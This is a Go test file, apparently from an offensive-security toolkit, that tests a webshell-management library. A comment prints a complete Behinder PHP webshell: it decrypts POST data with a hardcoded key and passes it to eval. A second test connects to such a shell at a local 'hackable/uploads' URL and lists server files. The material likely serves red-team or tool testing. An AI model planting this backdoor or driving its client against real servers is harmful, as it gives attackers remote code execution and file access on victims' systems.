package yaktest

import (
	"github.com/davecgh/go-spew/spew"
	"github.com/xiecat/wsm"
	"github.com/xiecat/wsm/lib/shell"
	"github.com/xiecat/wsm/lib/shell/behinder"
	"testing"
)

func TestGenerateWSM(t *testing.T) {
	passwd, shell2 := behinder.GenRandShell(shell.PhpScript)
	spew.Dump(passwd)
	/*
		K8yeaZZ5FOHjfpC
		<?php @error_reporting(0);session_start(); $key="2f3bcedbb587de9e"; $_SESSION['k']=$key; session_write_close(); $post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++) {     $post[$i] = $post[$i]^$key[$i+1&15];     }}else{$post=openssl_decrypt($post, "AES128", $key);} $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1];class C{public function __invoke($p) {eval($p."");}} @call_user_func(new C(),$params);?>
	*/
	println(shell2)
}

func TestBehinderPHP(t *testing.T) {
	info, err := wsm.NewBehinder(&wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://127.0.0.1/hackable/uploads/test.php",
			Password: "K8yeaZZ5FOHjfpC",
			Script:   shell.PhpScript,
		},
	})
	if err != nil {
		panic(err)
		return
	}
	result, err := info.BasicInfo()
	if err != nil {
		panic(err)
	}
	_ = result

	result, err = info.FileManagement(&behinder.ListFiles{
		Path: "/tmp",
	})
	if err != nil {
		panic(err)
	}
	println(result.ToString())
	result.Parser()
	spew.Dump(result.ToMap())
	//spew.Dump(result)
}
